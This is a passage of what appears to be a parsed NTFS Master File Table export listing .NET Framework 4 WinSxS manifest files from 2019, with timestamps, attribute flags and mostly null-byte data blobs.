00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00'}",,,,
86760,Valid,In Use,File,2,14932,0,$$_microsoft.net_framework_83386eac0379231b.cdf-ms,,2018-09-15T07:31:34.444Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,2019-03-19T10:58:21.821Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,2019-03-19T10:55:29.977Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,"{'size': 19703626332373028, 'data': b'_\x00D\x00A\x00T\x00A\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x05\x00\x01\x00\x00\x00\x01\x00\x00\x00\xa6\x02\x00\x00\x00\x00\x00\x00\x01\x02*\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00q\x02\x00\x00\xff\xff\xff\xff\x82yG\x11\x05\x00\x00\x00\x00\x00\x05\x00\x01\x00\x00\x00\x01\x00\x00\x00\xa6\x02\x00\x00\x00\x00\x00\x00\x00z""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00'}",,,,
86774,Valid,In Use,File,2,14935,0,x86_presentationcore_31bf3856ad364e35_4.0.15713.205_none_ec1fb017aab5d61b.anifest,,2019-03-19T10:55:22.305Z,2019-03-19T10:55:21.727Z,2019-03-19T11:00:23.945Z,2019-03-19T10:55:22.305Z,2019-03-19T10:55:21.727Z,2019-03-19T10:55:21.727Z,2019-03-19T10:55:21.727Z,2019-03-19T10:55:21.727Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x001\x01`\xaa.\x00\x00\x00\x00\x01\x00\x00(\x00\x00\x00\x00\x04\x18\x00\x00\x00\x04\x00\x08\x00\x00\x00 \x00\x00\x00$\x00D\x00S\x00C\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00'}",,,,
86779,Valid,In Use,File,2,14935,0,amd64_mscorlib_b77a5c561934e089_4.0.15713.205_none_17701d0a3874fdcb.manifet,,2019-03-19T10:55:22.320Z,2019-03-19T10:55:21.821Z,2019-03-19T11:00:23.617Z,2019-03-19T10:55:22.320Z,2019-03-19T10:55:21.821Z,2019-03-19T10:55:21.821Z,2019-03-19T10:55:21.821Z,2019-03-19T10:55:21.821Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 2}",None,None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x001\x03e\xaa.\x00\x00\x00\x00\x01\x00\x00(\x00\x00\x00\x00\x04\x18\x00\x00\x00\x04\x00\x08\x00\x00\x00 \x00\x00\x00$\x00D\x00S\x00C\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00'}",,,,
86784,Valid,In Use,File,2,14935,0,x86_netfx4-sos_dll_b03f5f7f11d50a3a_4.0.15713.205_none_25227d0dc50d8276.maifest,,2019-03-19T10:55:22.320Z,2019-03-19T10:55:21.915Z,2019-03-19T11:00:23.054Z,2019-03-19T10:55:22.337Z,2019-03-19T10:55:21.915Z,2019-03-19T10:55:21.915Z,2019-03-19T10:55:21.915Z,2019-03-19T10:55:21.915Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x001\x01h\xad.\x00\x00\x00\x00\x01\x00\x00(\x00\x00\x00\x00\x04\x18\x00\x00\x00\x04\x00\x08\x00\x00\x00 \x00\x00\x00$\x00D\x00S\x00C\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00'}",,,,
86786,Valid,In Use,File,2,14935,0,amd64_netfx4-system_b03f5f7f11d50a3a_4.0.15713.205_none_bbc3df8ec636aa97.mnifest,,2019-03-19T10:55:22.337Z,2019-03-19T10:55:21.930Z,2019-03-19T11:00:23.789Z,2019-03-19T10:55:22.337Z,2019-03-19T10:55:21.930Z,2019-03-19T10:55:21.930Z,2019-03-19T10:55:21.930Z,2019-03-19T10:55:21.930Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x001\x01j\xad.\x00\x00\x00\x00\x01\x00\x00(\x00\x00\x00\x00\x04\x18\x00\x00\x00\x04\x00\x08\x00\x00\x00 \x00\x00\x00$\x00D\x00S\x00C\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00'}",,,,
86787,Valid,In Use,File,2,14935,0,amd64_netfx4-wpfgfx_b03f5f7f11d50a3a_4.0.15713.205_none_2a197889adc4941e.mnifest,,2019-03-19T10:55:22.337Z,2019-03-19T10:55:21.930Z,2019-03-19T11:00:23.179Z,2019-03-19T10:55:22.337Z,2019-03-19T10:55:21.930Z,2019-03-19T10:55:21.930Z,2019-03-19T10:55:21.930Z,2019-03-19T10:55:21.930Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x001\x01k\xad.\x00\x00\x00\x00\x01\x00\x00(\x00\x00\x00\x00\x04\x18\x00\x00\x00\x04\x00\x08\x00\x00\x00 \x00\x00\x00$\x00D\x00S\x00C\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00'}",,,,
86790,Valid,In Use,File,2,14935,0,amd64_netfx4-penimc_b03f5f7f11d50a3a_4.0.15713.205_none_2a1ffd3c77b877d0.mnifest,,2019-03-19T10:55:22.337Z,2019-03-19T10:55:21.961Z,2019-03-19T11:00:23.342Z,2019-03-19T10:55:22.337Z,2019-03-19T10:55:21.961Z,2019-03-19T10:55:21.961Z,2019-03-19T10:55:21.961Z,2019-03-19T10:55:21.961Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x001\x01n\xad.\x00\x00\x00\x00\x01\x00\x00(\x00\x00\x00\x00\x04\x18\x00\x00\x00\x04\x00\x08\x00\x00\x00 \x00\x00\x00$\x00D\x00S\x00C\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00'}",,,,
86791,Valid,In Use,File,2,14935,0,msil_system.core_b77a5c561934e089_4.0.15713.205_none_2b6355a44039fda3.maniest,,2019-03-19T10:55:22.337Z,2019-03-19T10:55:21.961Z,2019-03-19T11:00:22.882Z,2019-03-19T10:55:22.337Z,2019-03-19T10:55:21.961Z,2019-03-19T10:55:21.961Z,2019-03-19T10:55:21.961Z,2019-03-19T10:55:21.961Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x001\x01o\xad.\x00\x00\x00\x00\x01\x00\x00(\x00\x00\x00\x00\x04\x18\x00\x00\x00\x04\x00\x08\x00\x00\x00 \x00\x00\x00$\x00D\x00S\x00C\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00'}",,,,
86792,Valid,In Use,File,2,14935,0,x86_netfx4-penimc_b03f5f7f11d50a3a_4.0.15713.205_none_71cd34138c34a0d6.manfest,,2019-03-19T10:55:22.337Z,2019-03-19T10:55:21.981Z,2019-03-19T11:00:23.351Z,2019-03-19T10:55:22.337Z,2019-03-19T10:55:21.981Z,2019-03-19T10:55:21.981Z,2019-03-19T10:55:21.981Z,2019-03-19T10:55:21.981Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\xc5\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x001\x01p\xad.\x00\x00\x00\x00\x01\x00\x00(\x00\x00\x00\x00\x04\x18\x00\x00\x00\x04\x00\x08\x00\x00\x00 \x00\x00\x00$\x00D\x00S\x00C\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00'}",,,,
86794,Valid,In Use,File,2,14935,0,amd64_netfx4-clr_dll_b03f5f7f11d50a3a_4.0.15713.205_none_36443b856b3eb28a.anifest,,2019-03-19T10:55:22.337Z,2019-03-19T10:55:22.008Z,2019-03-19T11:00:23.226Z,2019-03-19T10:55:22.337Z,2019-03-19T10:55:22.008Z,2019-03-19T10:55:22.008Z,2019-03-19T10:55:22.008Z,2019-03-19T10:55:22.008Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,True,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x001\x01\x12\xa30\x00\x00\x00\x00\x01\x00\x00(\x00\x00\x00\x00\x04\x18\x00\x00\x00\x04\x00\x08\x00\x00\x00 \x00\x00\x00$\x00D\x00S\x00C\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x